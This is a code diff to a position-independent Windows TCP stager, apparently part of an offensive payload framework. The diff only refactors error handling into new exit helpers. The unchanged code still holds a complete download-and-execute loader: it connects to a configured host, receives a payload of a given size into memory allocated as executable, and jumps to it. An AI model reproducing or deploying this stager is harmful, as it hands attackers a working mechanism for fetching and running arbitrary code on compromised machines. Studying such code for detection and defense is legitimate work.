@@ -82,6 +82,17 @@ struct resolved_funcs {
 };
 
 PIC_TEXT
+__attribute__((noreturn)) static void fail_fast(void) { __builtin_trap(); }
+
+PIC_TEXT
+__attribute__((noreturn)) static void exit_process(
+	fn_ExitProcess pExitProcess, unsigned int uExitCode)
+{
+	pExitProcess(uExitCode);
+	fail_fast();
+}
+
+PIC_TEXT
 static int resolve_funcs(struct resolved_funcs *f)
 {
 	f->pVirtualAlloc = (fn_VirtualAlloc)pic_resolve(
@@ -126,9 +137,9 @@ void _start(void)
 	PIC_SELF_RELOCATE();
 
 	struct resolved_funcs f;
-	if (!resolve_funcs(&f))
-		for (;;)
-			;
+	if (!resolve_funcs(&f)) {
+		fail_fast();
+	}
 
 	/*
 	 * WSADATA is ~400 bytes. Allocate enough space to match the size
@@ -143,37 +154,38 @@ void _start(void)
 	const pic_u8 *cfg = (const pic_u8 *)stager_tcp_windows_config;
 
 	pic_uintptr s = f.pSocket((int)cfg[0], SOCK_STREAM, 0);
-	if (s == INVALID_SOCKET)
-		f.pExitProcess(1);
+	if (s == INVALID_SOCKET) {
+		exit_process(f.pExitProcess, 1);
+	}
 
 	struct pic_sockaddr_in sa;
 	init_sockaddr(&sa, cfg);
 
 	if (f.pConnect(s, &sa, (int)sizeof(sa)) < 0) {
 		f.pCloseSocket(s);
-		f.pExitProcess(1);
+		exit_process(f.pExitProcess, 1);
 	}
 
 	pic_u32 size = recv_payload_size(f.pRecv, s);
 	if (size == 0 || size > 0x10000000) {
 		f.pCloseSocket(s);
-		f.pExitProcess(1);
+		exit_process(f.pExitProcess, 1);
 	}
 
 	void *mem = f.pVirtualAlloc(PIC_NULL, (pic_uintptr)size,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!mem) {
 		f.pCloseSocket(s);
-		f.pExitProcess(1);
+		exit_process(f.pExitProcess, 1);
 	}
 
 	if (!recv_all(f.pRecv, s, mem, size)) {
 		f.pCloseSocket(s);
-		f.pExitProcess(1);
+		exit_process(f.pExitProcess, 1);
 	}
 	f.pCloseSocket(s);
 
 	((void (*)(void))mem)();
 
-	f.pExitProcess(0);
+	exit_process(f.pExitProcess, 0);
 }
